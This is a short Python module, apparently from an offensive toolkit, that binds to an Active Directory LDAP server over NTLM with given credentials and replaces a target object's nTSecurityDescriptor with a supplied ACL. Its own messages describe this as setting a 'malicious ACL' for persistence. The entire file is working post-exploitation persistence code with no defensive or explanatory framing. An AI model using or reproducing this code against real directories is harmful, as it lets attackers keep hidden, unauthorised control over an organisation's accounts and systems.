import ldap3

class ACLPersistor:
    def __init__(self, config, verbose=False):
        self.config = config
        self.verbose = verbose

    def persist(self):
        server = ldap3.Server(self.config["ldap_server"], get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=self.config["bind_dn"],
            password=self.config["password"],
            authentication=ldap3.NTLM,
            auto_bind=True
        )

        target_dn = self.config["target_dn"]
        acl_blob = self.config["acl"]

        if self.verbose:
            print(f"[INFO] Setting malicious ACL on {target_dn}")

        conn.modify(
            dn=target_dn,
            changes={"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [acl_blob.encode()])]}
        )

        if conn.result["description"] == "success":
            print("[+] ACL persistence successful")
        else:
            print(f"[-] Persistence failed: {conn.result}")
        conn.unbind()
